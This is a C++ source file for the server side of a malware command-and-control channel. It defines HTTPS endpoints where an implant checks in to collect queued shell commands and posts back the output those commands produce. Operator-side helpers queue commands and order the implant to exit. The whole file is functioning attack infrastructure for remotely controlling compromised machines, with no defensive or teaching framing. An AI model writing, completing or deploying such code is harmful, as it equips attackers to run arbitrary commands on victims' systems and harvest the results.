#include "beaconEndpoints.hpp"

#include <cstring>
#include <deque>
#include <iostream>
#include <mutex>
#include <utility>

#include "protocol.h"

namespace
{
std::mutex g_queue_mutex;
std::deque<std::string> g_queue;
bool g_exit_requested = false;

// Build the C2_HEADER-prefixed body the implant expects. The header still
// declares payload_size even though Content-Length carries the same number;
// frame() is the single place the two are kept consistent.
std::string frame(std::uint32_t command_id, const std::string &payload)
{
    C2_HEADER header{};
    header.magic = CHECK_IN_MAGIC;
    header.command_id = command_id;
    header.payload_size = static_cast<std::uint32_t>(payload.size());

    std::string body(sizeof(C2_HEADER), '\0');
    std::memcpy(body.data(), &header, sizeof header);
    body += payload;
    return body;
}

// Copy the header out of a request body, rejecting anything self-inconsistent.
bool parse_frame(const std::string &body, C2_HEADER &header)
{
    if (body.size() < sizeof(C2_HEADER))
        return false;

    std::memcpy(&header, body.data(), sizeof header);
    if (header.magic != CHECK_IN_MAGIC)
        return false;

    // The declared payload must account for the rest of the body exactly.
    return static_cast<std::size_t>(header.payload_size) + sizeof(C2_HEADER) ==
           body.size();
}
} // namespace

Pending take_pending(std::string &command)
{
    std::lock_guard<std::mutex> guard(g_queue_mutex);
    if (g_exit_requested)
        return Pending::Exit;
    if (g_queue.empty())
        return Pending::None;
    command = std::move(g_queue.front());
    g_queue.pop_front();
    return Pending::Command;
}

void queue_command(const std::string &command)
{
    std::lock_guard<std::mutex> guard(g_queue_mutex);
    g_queue.push_back(command);
}

void request_exit()
{
    std::lock_guard<std::mutex> guard(g_queue_mutex);
    g_exit_requested = true;
}

void register_all_beacon_endpoints(httplib::SSLServer &server)
{
    // Implant check-in: hand over the next queued command, or 204 if there is
    // none.
    server.Post(C2_PATH_CHECKIN, [](const httplib::Request &req, httplib::Response &res) {
        (void)req;

        std::string command;
        switch (take_pending(command))
        {
        case Pending::Exit:
            res.set_content(frame(CMD_EXIT, std::string()), "application/octet-stream");
            return;
        case Pending::Command:
            // Keep payload_size truthful before it is cast to uint32_t.
            if (command.size() > kMaxPayload)
            {
                res.status = 413;
                return;
            }
            res.set_content(frame(CMD_EXECUTE_SHELL, command),
                            "application/octet-stream");
            return;
        case Pending::None:
            res.status = 204;
            return;
        }
    });

    // Result upload: print the output the implant collected for a command.
    server.Post(C2_PATH_RESULT, [](const httplib::Request &req, httplib::Response &res) {
        C2_HEADER header{};
        if (!parse_frame(req.body, header))
        {
            res.status = 400;
            return;
        }
        if (header.payload_size > kMaxPayload)
        {
            res.status = 413;
            return;
        }

        std::cout << "\n[+] result (" << header.payload_size << " bytes):\n";
        if (header.payload_size != 0)
        {
            std::cout.write(req.body.data() + sizeof(C2_HEADER),
                            static_cast<std::streamsize>(header.payload_size));
        }
        std::cout << std::flush;

        res.status = 200;
    });
}
